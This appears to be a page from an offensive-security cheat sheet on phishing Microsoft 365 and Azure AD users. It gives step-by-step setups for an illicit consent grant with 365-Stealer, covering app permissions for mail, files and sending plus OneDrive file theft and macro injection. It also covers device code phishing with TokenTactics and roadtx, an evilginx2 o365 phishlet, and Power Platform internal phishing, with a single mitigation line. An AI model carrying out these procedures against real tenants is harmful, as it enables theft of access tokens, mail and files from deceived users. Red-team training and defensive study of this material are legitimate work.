# Azure AD - Phishing

## Illicit Consent Grant

> The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. 

:warning: All Office 365 users will be protected from app-based attacks now that publisher verification is generally available as they "will no longer be able to consent to new multi-tenant apps registered after November 8th, 2020 coming from unverified publishers".


Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`

* **Disable user consent** : Users cannot grant permissions to applications.   
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select** : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant    
* **Users can consent to all apps** : allows all users to consent to any permission which doesn't require admin consent.    
* **Custom app consent policy**   

### Register Application

1. Login to https://portal.azure.com > Azure Active Directory
2. Click on **App registrations** > **New registration**
3. Enter the Name for our application
4. Under support account types select **"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"**
5. Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is `https://<DOMAIN/IP>:<PORT>/login/authorized`.
6. Click **Register** and save the **Application ID**

### Configure Application

1. Click on `Certificates & secrets`
2. Click on `New client secret` then enter the **Description** and click on **Add**.
3. Save the **secret**'s value.
4. Click on API permissions > Add a permission
5. Click on Microsoft Graph > **Delegated permissions**
6. Search and select the below mentioned permissions and click on Add permission
    * Contacts.Read 
    * Mail.Read / Mail.ReadWrite
    * Mail.ReadBasic
    * Mail.Send
    * Notes.Read.All
    * Mailboxsettings.ReadWrite
    * Files.ReadWrite.All 
    * User.ReadBasic.All
    * User.Read


### Setup 365-Stealer (Deprecated)

:warning: Default port for 365-Stealer phishing is 443

- Run XAMPP and start Apache
- Clone 365-Stealer into `C:\xampp\htdocs\`
    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
- Install the requirements
    * Python3
    * PHP CLI or Xampp server
    * `pip install -r requirements.txt`
- Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache
- Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
    - Disable IP whitelisting `$enableIpWhiteList = false;`
- Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
    - **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.
    - **Client Secret** (Mandatory): Secret value from the Certificates & secrets tab that we created.
    - **Redirect URL** (Mandatory): Specify the redirect URL that we entered during registering the App like `https://<Domain/IP>/login/authorized` 
    - **Macros Location**: Path of macro file that we want to inject.
    - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
    - **Delay**: Delay the request by specifying time in seconds while stealing
- Create a Self Signed Certificate to use HTTPS
- Run the application either click on the button or run this command : `python 365-Stealer.py --run-app`
    - `--no-ssl`: disable HTTPS
    - `--port`: change the default listening port
    - `--token`: provide a specific token
    - `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
- Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.


### Vajra

> Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra

**Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".

### Roadtx

* Use the authorization code flow in `roadtx` to get token
```ps1
roadtx codeauth -c <app-id> -r msgraph -t <tenant-id> <0.A....> -ru 'https://<phish-app>/redir' -p <app-secret>
```


## Device Code Phishing

* Using roadtool: `roadtx gettokens -u user@domain.lab --device-code`
    ```ps1
    roadtx.exe auth --device-code -c 29d9ed98-a469-4536-ade2-f981bc1d605e
    Requesting token for resource https://graph.windows.net
    To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code XXXXXXXXX to authenticate.
    ```

* Using TokenTactics to request a token for Azure Graph API using a device code
    ```ps1
    Import-Module .\TokenTactics.psd1
    Get-AzureToken -Client Graph
    ```
* Replace `<REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS>` in the [phishing email](https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft)
* Leave TokenTactics running in the PowerShell window and send the phishing email
* Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form
* Enjoy your **access token** and **refresh token**


## Phishing with Evilginx2

* Run [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) with o365 phishlet
    ```powershell
    PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
    : config domain username.corp
    : config ip 10.10.10.10
    : phishlets hostname o365 login.username.corp
    : phishlets get-hosts o365
    ```
* Create a DNS entry type A for `login.login.username.corp` and `www.login.username.corp`, pointing to your machine
* Copy certificate and enable the phishing
    ```ps1
    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
    : phishlets enable o365

    # get the phishing URL
    : lures create o365
    : lures get-url 0
    ```


### Internal Phishing - Power Platform

> Set up an internal phishing application on a Microsoft-owned domains which will automatically authenticate as users browse to your link.


* Install [mbrg/power-pwn](https://github.com/mbrg/power-pwn) - An offensive and defensive security toolset for Microsoft 365 Power Platform
    ```ps1
    pip install powerpwn
    ```
* Install the application: `powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {path to application package zip} -n {application name}`
* Share application with org: `powerpwn phishing share-app -t {tenant-id} -e {environment-id} -a {app id}`


## References

* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
* [The Art of the Device Code Phish - Bobby Cooke - July 12, 2021](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
* [Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023](https://www.youtube.com/watch?v=LpdckZyBwvs)
* [Low Code High Risk - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022](https://www.youtube.com/watch?v=D3A62Rzozq4)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)